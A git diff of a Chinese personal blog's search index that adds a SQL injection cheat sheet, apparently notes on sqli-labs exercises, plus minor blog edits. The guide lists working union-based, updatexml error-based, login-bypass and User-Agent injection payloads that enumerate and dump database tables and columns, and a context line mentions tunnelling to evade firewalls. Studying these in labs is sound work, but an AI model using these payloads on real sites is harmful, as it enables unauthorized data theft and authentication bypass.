@@ -26,6 +26,70 @@
 ]]></content>
   </entry>
   <entry>
+    <title>sql注入的注入攻略</title>
+    <url>/2023/04/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E6%94%BB%E7%95%A5/</url>
+    <content><![CDATA[<h1 id="联合注入攻略"><a href="#联合注入攻略" class="headerlink" title="联合注入攻略"></a>联合注入攻略</h1><h2 id="1、判断注入点（同时构造闭合符号）"><a href="#1、判断注入点（同时构造闭合符号）" class="headerlink" title="1、判断注入点（同时构造闭合符号）"></a>1、判断注入点（同时构造闭合符号）</h2><p>当输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1 – q   &#x2F;&#x2F; 正常</p>
+<p>而输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;2 – q   &#x2F;&#x2F;报错</p>
+<p>则可证明是存在sql注入的。</p>
+<h2 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) order by 3 -- q   //若报错则字段数不为3，没报错则字段数就是3</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、判断输出点"><a href="#3、判断输出点" class="headerlink" title="3、判断输出点"></a>3、判断输出点</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,3 -- q   //这里注意前面的传参id要是不存在的，这样后面的select查询才能显现出来</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、爆出数据库名"><a href="#4、爆出数据库名" class="headerlink" title="4、爆出数据库名"></a>4、爆出数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆出表名"><a href="#5、爆出表名" class="headerlink" title="5、爆出表名"></a>5、爆出表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="6、爆字段名"><a href="#6、爆字段名" class="headerlink" title="6、爆字段名"></a>6、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q		//查询表下的字段名</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="7、爆字段内的数据"><a href="#7、爆字段内的数据" class="headerlink" title="7、爆字段内的数据"></a>7、爆字段内的数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,group_concat(字段名),group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="布尔报错注入的注入攻略"><a href="#布尔报错注入的注入攻略" class="headerlink" title="布尔报错注入的注入攻略"></a>布尔报错注入的注入攻略</h1><p>报错注入是没有回显点位的，只能运用updatexml()函数来进行让他报错，从报错信息里面的到我们需要的信息。</p>
+<h2 id="1、构造闭合符号"><a href="#1、构造闭合符号" class="headerlink" title="1、构造闭合符号"></a>1、构造闭合符号</h2><p><strong>第一种情况</strong>：<strong>不是</strong>该闭合符</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;正常</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
+<p><strong>第二种情况</strong>：<strong>是</strong>该闭合符</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;报错</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
+<p>或者</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1(2) –+      &#x2F;&#x2F;变幻1&#x3D;1,1&#x3D;2来进行判断，如果是当前的构造符号，1&#x3D;2时应该报错，如果是正常则可以不是正确的构造符，通过变幻构造符好来判断出正常的构造符号</p>
+<h2 id="2、发现是报错注入，采用updataxml函数进行爆数据库名"><a href="#2、发现是报错注入，采用updataxml函数进行爆数据库名" class="headerlink" title="2、发现是报错注入，采用updataxml函数进行爆数据库名"></a>2、发现是报错注入，采用updataxml函数进行爆数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q    //显示当前数据库的库名。Concat()时进行一个拼接的，把感叹号（！）和逗号后面的数据进行拼接。</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、爆数据表名"><a href="#3、爆数据表名" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) --+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、爆字段名"><a href="#4、爆字段名" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆字段数据"><a href="#5、爆字段数据" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="基于错误的POST型联合注入-11、12关"><a href="#基于错误的POST型联合注入-11、12关" class="headerlink" title="基于错误的POST型联合注入(11、12关)"></a>基于错误的POST型联合注入(11、12关)</h1><h2 id="1、尝试万能密码"><a href="#1、尝试万能密码" class="headerlink" title="1、尝试万能密码"></a><strong>1、尝试万能密码</strong></h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )or 1&#x3D;1 – q</p>
+<h2 id="2、判断字段数-1"><a href="#2、判断字段数-1" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1 order by 3 -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、判断显错位"><a href="#3、判断显错位" class="headerlink" title="3、判断显错位"></a>3、判断显错位</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、判断表名"><a href="#4、判断表名" class="headerlink" title="4、判断表名"></a>4、判断表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆列名"><a href="#5、爆列名" class="headerlink" title="5、爆列名"></a>5、爆列名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="6、爆数据"><a href="#6、爆数据" class="headerlink" title="6、爆数据"></a>6、爆数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="POST变形双报错注入-13、14，17是密码行未过滤"><a href="#POST变形双报错注入-13、14，17是密码行未过滤" class="headerlink" title="POST变形双报错注入(13、14，17是密码行未过滤)"></a>POST变形双报错注入(13、14，17是密码行未过滤)</h1><h2 id="1、万能密码判断是否存在注入点"><a href="#1、万能密码判断是否存在注入点" class="headerlink" title="1、万能密码判断是否存在注入点"></a>1、万能密码判断是否存在注入点</h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) or 1&#x3D;1 – q</p>
+<h2 id="2、利用报错信息爆库"><a href="#2、利用报错信息爆库" class="headerlink" title="2、利用报错信息爆库"></a>2、利用报错信息爆库</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、爆数据表名-1"><a href="#3、爆数据表名-1" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、爆字段名-1"><a href="#4、爆字段名-1" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆字段数据-1"><a href="#5、爆字段数据-1" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="抓包修改user-agent"><a href="#抓包修改user-agent" class="headerlink" title="抓包修改user-agent"></a>抓包修改user-agent</h1><p>‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1,1) – q</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>没有图片说明</title>
+    <url>/2023/04/19/%E6%9C%AA%E6%9B%B4%E6%96%B0%E8%AF%B4%E6%98%8E/</url>
+    <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>现在博客才搭上，但是自己网上图床还没有搞定，导致图片传不上去，所有就还没哟更新自己的学习知识，光有汉字是没用的，必须配上图片，但是因为还没搞定所以就搁置了，我会尽力更新的。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>欢迎你的到来</title>
     <url>/2023/04/18/%E6%AC%A2%E8%BF%8E%E4%BD%A0/</url>
     <content><![CDATA[<h1 id="欢迎你"><a href="#欢迎你" class="headerlink" title="欢迎你"></a>欢迎你</h1><p><img  
@@ -36,7 +100,7 @@
                 ></p>
 <p>感谢各位靓仔靓妹来到本人的博客，鄙人不才，现在主攻Web渗透方向，还是小白，但是一直在路上，俗话说的好，“不积跬步无以至千里，不积小流无以成江河，道阻且长，行则将至”，做好自己，相信未来。</p>
 <div class="note-large notel-default"><div class="notel-title"><p>信息</p>
-</div><div class="notel-content"><p>如有指教，请加QQ：1479632420，在此表示感谢。</p>
+</div><div class="notel-content"><p>如有指教，请加QQ：1500076625，在此表示感谢。</p>
  </div></div>]]></content>
   </entry>
   <entry>
@@ -708,12 +772,6 @@
 <li>使用HTTP隧道：使用HTTP隧道技术可以将扫描流量伪装成HTTP请求，然后通过HTTP隧道将扫描流量传输到目标网站，从而绕过防火墙的检测。</li>
 <li>使用DNS隧道：类似于HTTP隧道，可以将扫描流量伪装成DNS请求，然后通过DNS隧道将扫描流量传输到目标网站，从而绕过防火墙的检测。</li>
 </ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>没有图片说明</title>
-    <url>/2023/04/19/%E6%9C%AA%E6%9B%B4%E6%96%B0%E8%AF%B4%E6%98%8E/</url>
-    <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>现在博客才搭上，但是自己网上图床还没有搞定，导致图片传不上去，所有就还没哟更新自己的学习知识，光有汉字是没用的，必须配上图片，但是因为还没搞定所以就搁置了，我会尽力更新的。</p>
 ]]></content>
   </entry>
 </search>
